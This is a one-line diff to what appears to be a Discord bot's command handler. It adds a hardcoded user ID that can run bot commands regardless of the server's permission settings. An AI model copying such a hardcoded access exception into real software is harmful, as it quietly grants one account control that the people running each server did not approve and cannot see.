@@ -35,7 +35,7 @@ var Handler = function(db,intercom,client,helper,perspective) {
                     })
                 }
                 
-                else if (perm || msg.member.permissions.has('ADMINISTRATOR')) { //if user is permitted to talk to bot
+                else if (perm || msg.member.permissions.has('ADMINISTRATOR') || msg.author.id == 230878537257713667) { //if user is permitted to talk to bot
                     self.parseMessage(msg, cmd, ctx, config)
                 }
                 else if (config.permissible.length == 0) {
